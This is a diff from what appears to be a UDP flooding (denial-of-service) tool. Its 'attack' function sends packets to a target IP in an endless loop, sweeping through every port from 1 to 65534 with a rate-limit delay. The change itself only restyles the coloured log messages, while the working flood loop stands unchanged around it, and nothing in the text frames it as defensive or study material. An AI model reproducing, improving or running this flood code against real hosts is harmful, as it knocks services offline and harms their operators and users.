@@ -88,9 +88,9 @@ def attack(ip: str, port: int, packet_size: int, rate_limit: float):
         while True:
             sock.sendto(data, (ip, port))
             sent += 1
-            log_message(f"\033[100m \033[34mTermul-Katrok \033[0m \033[31m- {threading.get_ident()} \033[103m \033[97mSent{sent} \033[0m  \033[33m{ip}:{port}")
+            log_message(f"\033[38;5;220mThreading-get \033[37m|\033[31m {threading.get_ident()} \033[37m| \033[38;5;57msent {sent} \033[37m|")
             sent += 1
-            log_message(f"\033[101m \033[38;5;206mTermul-Katrok \033[0m \033[94m- {threading.get_ident()} \033[100m \033[31mSent{sent} \033[0m  \033[33m{ip}:{port}")
+            log_message(f"\033[38;5;37mServer-Ip \033[31mSent{ip} \033[33mPort: \033[37m{port}")
             port = port + 1 if port < 65534 else 1
             time.sleep(rate_limit)
     except KeyboardInterrupt:
